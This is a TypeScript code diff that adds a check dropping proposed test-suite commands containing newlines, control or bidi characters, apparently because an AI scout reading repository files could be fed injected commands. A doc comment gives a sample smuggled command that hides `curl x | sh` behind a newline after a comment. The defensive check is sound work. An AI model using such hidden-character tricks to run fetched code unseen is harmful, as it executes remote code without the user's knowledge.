@@ -89,14 +89,27 @@ export type Scouting = typeof ScoutAnswer.Type
 export const hasPlaceholder = (command: string): boolean => /<[^<>]*\S[^<>]*>/.test(command)
 
 /**
+ * Whether a command holds a character a terminal doesn't show as it runs: a newline or another C0
+ * control, DEL, a C1 control, or a bidi override or isolate. A checklist shows a command on one
+ * line, with these removed or made spaces, while sh runs it as written: `npm test # see\ncurl x |
+ * sh` reads as one command and a comment, and runs curl. The scout reads files the repository
+ * holds, so such a command may be an injection's.
+ */
+export const hasHiddenCharacter = (command: string): boolean =>
+  // biome-ignore lint/suspicious/noControlCharactersInRegex: the controls are what it looks for
+  /[\u0000-\u001f\u007f-\u009f\u202a-\u202e\u2066-\u2069]/.test(command)
+
+/**
  * The answer tidied, as orchestra's: names, commands, places and costs trimmed, a command for part
  * of the project without a placeholder dropped, covers_fast kept only on a full suite, blank needs
  * and stack items dropped, stack items' spaces
- * collapsed and duplicates dropped. A suite with no name or no command is the reason it can't be
- * used.
+ * collapsed and duplicates dropped. A suite whose command or command for part of the project holds
+ * a hidden character (hasHiddenCharacter) once trimmed is dropped, and the note says so, for init
+ * to show. A suite with no name or no command is the reason it can't be used.
  */
 export const tidy = (answer: Scouting): Scouting | string => {
   const suites: Array<Suite> = []
+  const dropped: Array<string> = []
   for (const suite of answer.suites) {
     const name = suite.name.trim()
     const command = suite.command.trim()
@@ -104,6 +117,12 @@ export const tidy = (answer: Scouting): Scouting | string => {
       return `a suite with no name or no command: ${JSON.stringify(suite)}`
     }
     const targeted = suite.targeted.trim()
+    if (hasHiddenCharacter(command) || hasHiddenCharacter(targeted)) {
+      dropped.push(
+        `Left out the suite ${JSON.stringify(name)}: its command holds a newline or a control character, which would run unseen.`,
+      )
+      continue
+    }
     suites.push({
       ...suite,
       name,
@@ -121,7 +140,8 @@ export const tidy = (answer: Scouting): Scouting | string => {
     const words = item.trim().split(/\s+/).join(" ")
     if (words !== "" && !stack.includes(words)) stack.push(words)
   }
-  return { suites, stack, note: answer.note.trim() }
+  const note = [answer.note.trim(), ...dropped].filter((part) => part !== "").join(" ")
+  return { suites, stack, note }
 }
 
 // ---------------------------------------------------------------------------------------------
